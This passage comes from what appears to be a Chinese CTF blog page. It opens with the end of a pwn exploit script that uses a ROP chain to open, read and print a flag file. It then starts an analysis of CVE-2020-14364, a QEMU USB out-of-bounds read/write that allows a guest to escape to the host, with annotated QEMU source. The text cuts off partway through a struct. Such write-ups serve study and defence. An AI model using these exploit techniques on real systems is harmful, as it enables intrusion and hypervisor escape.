p64(syscall_ret)</span><br><span class="line"><span class="comment">#read(3,buf,0x200)</span></span><br><span class="line">pay += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">pay += p64(pop_rsi) + p64(heap &amp; <span class="number">0xfffffffffffff000</span>) <span class="comment">#buf</span></span><br><span class="line">pay += p64(pop_rdx_r12) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(syscall_ret)</span><br><span class="line"><span class="comment">#write(1,buf,0x200)</span></span><br><span class="line">pay += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">pay += p64(pop_rsi) + p64(heap &amp; <span class="number">0xfffffffffffff000</span>)</span><br><span class="line">pay += p64(pop_rdx_r12) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">pay += p64(syscall_ret)</span><br><span class="line">pay += <span class="string">"./flag\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(len(pay))</span></span><br><span class="line">buy(<span class="number">0x200</span>,pay + <span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">11</span>)</span><br><span class="line"><span class="comment">#debug(0x167b)</span></span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/23/cve-2020-14364 qemu逃逸漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/10/23/cve-2020-14364 qemu逃逸漏洞/" itemprop="url">cve-2020-14364 qemu逃逸漏洞分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-23T16:41:06+08:00">
+                2020-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>本文使用的是<code>qemu-2.10.1</code>，<code>linux-4.10.10</code></p>
+<p>编译qemu时关闭优化并开启调试信息，方便调试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu-2.10.1/</span><br><span class="line">CFLAGS=<span class="string">"-no-pie -fno-stack-protector -z execstack"</span> ./configure --<span class="built_in">enable</span>-debug --<span class="built_in">disable</span>-strip</span><br></pre></td></tr></table></figure>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/qemu-2.10.1/x86_64-softmmu/qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-usb \</span><br><span class="line">-device usb-ehci,id=ehci \</span><br><span class="line">-device usb-tablet,bus=ehci.0 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.img \</span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr uid=0"</span> \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+<p>启动后在另一个窗口用<code>attach pie</code>调试进程</p>
+<p>通过lspci命令，查看usb设备所在在总线号，这里是00:03.0</p>
+<p><img src="\images\cve-2020-14634\1.png" alt="1"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="usb-process-one"><a href="#usb-process-one" class="headerlink" title="usb_process_one"></a>usb_process_one</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usb_process_one</span><span class="params">(USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span></span><br><span class="line"><span class="comment">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span></span><br><span class="line"><span class="comment">     * or USB_RET_ASYNC from going through usb_queue_one().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p-&gt;status = USB_RET_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;ep-&gt;nr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* control pipe */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;parameter) &#123;</span><br><span class="line">            do_parameter(dev, p);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">            do_token_setup(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">            do_token_in(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">            do_token_out(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            p-&gt;status = USB_RET_STALL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* data pipe */</span></span><br><span class="line">        usb_device_handle_data(dev, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>qemu\hw\core.c</code>中的<code>usb_process_one</code>是对usb包进行处理的函数，参数是USBPacket结构，根据Packet中的pie进行设置(do_token_setup)、读(do_token_in)、写(do_token_out)三个操作中的一个</p>
+<h3 id="do-token-setup"><a href="#do-token-setup" class="headerlink" title="do_token_setup"></a>do_token_setup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_setup</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;iov.size != <span class="number">8</span>) &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = <span class="number">0</span>;</span><br><span class="line">    p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">6</span>]; <span class="comment">//---------&gt; [1]</span></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_len &gt; <span class="keyword">sizeof</span>(s-&gt;data_buf)) &#123;                  <span class="comment">//---------&gt; [2]</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">"usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n"</span>,</span><br><span class="line">                s-&gt;setup_len, <span class="keyword">sizeof</span>(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">        usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                  s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_SETUP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status != USB_RET_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;actual_length &lt; s-&gt;setup_len) &#123;</span><br><span class="line">            s-&gt;setup_len = p-&gt;actual_length;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_len == <span class="number">0</span>)</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;actual_length = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>qemu\hw\core.c</code>中的<code>do_token_setup</code>函数；</p>
+<p>【1】处<code>s-&gt;setup_len</code>由<code>s-&gt;setup_buf[6]`</code>s-&gt;setup_buf[7]`决定，所以len可控制</p>
+<p>【2】处的判断，过大的<code>s-&gt;setup_len</code>会进行返回，但是<code>s-&gt;setup_len</code>已经被赋值，所以该处的检查没有起到效果。</p>
+<h3 id="do-token-in"><a href="#do-token-in" class="headerlink" title="do_token_in"></a>do_token_in</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_in</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;     <span class="comment">//-----------&gt;[3]</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">//---------[4]</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>qemu\hw\core.c</code>中的<code>do_token_in</code>函数；</p>
+<p>【3】处使用<code>s-&gt;setup_len</code>获得<code>len</code>，而<code>p-&gt;iov.size</code>可由用户控制，例如设置<code>p-&gt;iov.size</code>为<code>0x2000</code>，则最后len为0x2000，所以会造成【4】处的复制操作造成越界访问</p>
+<h3 id="do-token-out"><a href="#do-token-out" class="headerlink" title="do_token_out"></a>do_token_out</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_token_out</span><span class="params">(USBDevice *s, USBPacket *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            <span class="comment">/* transfer OK */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* ignore additional output */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            <span class="keyword">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;              <span class="comment">//----------------[5]</span></span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len); <span class="comment">//------------[6]</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>qemu\hw\core.c</code>中的<code>do_token_out</code>函数；</p>
+<p>同<code>do_token_out</code>函数，【5】处可控制 len，【6】处造成越界写</p>
+<h3 id="USBDevice"><a href="#USBDevice" class="headerlink" title="USBDevice"></a>USBDevice</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="keyword">char</span> *port_path;</span><br><span class="line">    <span class="keyword">char</span> *serial;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="keyword">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="keyword">int</span> speedmask;</span><br><span class="line">    <span class="keyword">uint8_t</span> addr;</span><br><span class="line">    <span class="keyword">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> auto_attach;</span><br><span class="line">    <span class="keyword">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> state;</span><br><span class="line">    <span class="keyword">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data_buf[<span class="number">4096</span>]; &lt;-------------</span><br><span class="line">    <span class="keyword">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_state;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_len;</span><br><span class="line">    <span class="keyword">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="keyword">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="keyword">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> configuration;</span><br><span class="line">    <span class="keyword">int</span> ninterfaces;</span><br><span class="line">    <span class="keyword">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="keyword">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="keyword">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="EHCIState"><a href="#EHCIState" class="headerlink" title="EHCIState"></a>EHCIState</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EHCIState</span> &#123;</span></span><br><span class="line">    USBBus bus;</span><br><span class="line">    DeviceState *device;</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    MemoryRegion mem;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">    MemoryRegion mem_caps;</span><br><span class="line">    MemoryRegion mem_opreg;</span><br><span class="line">    MemoryRegion mem_ports;</span><br><span class="line">    <span class="keyword">int</span> companion_count;</span><br><span class="line">    <span class="keyword">bool</span> companion_enable;</span><br><span class="line">    <span class="keyword">uint16_t</span> capsbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> opregbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portscbase;</span><br><span class="line">    <span class="keyword">uint16_t</span> portnr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* properties */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> maxframes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  EHCI spec version 1.0 Section 2.3</span></span><br><span class="line"><span class="comment">     *  Host Controller Operational Registers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> caps[CAPA_SIZE];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">uint32_t</span> usbcmd;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbsts;</span><br><span class="line">            <span class="keyword">uint32_t</span> usbintr;</span><br><span class="line">            <span class="keyword">uint32_t</span> frindex;</span><br><span class="line">            <span class="keyword">uint32_t</span> ctrldssegment;</span><br><span class="line">            <span class="keyword">uint32_t</span> periodiclistbase;</span><br><span class="line">            <span class="keyword">uint32_t</span> asynclistaddr;</span><br><span class="line">            <span class="keyword">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> configflag;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> portsc[NB_PORTS];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  Internal states, shadow registers, etc</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QEMUTimer *frame_timer;</span><br><span class="line">    QEMUBH *async_bh;</span><br><span class="line">    <span class="keyword">bool</span> working;</span><br><span class="line">    <span class="keyword">uint32_t</span> astate;         <span class="comment">/* Current state in asynchronous schedule */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pstate;         <span class="comment">/* Current 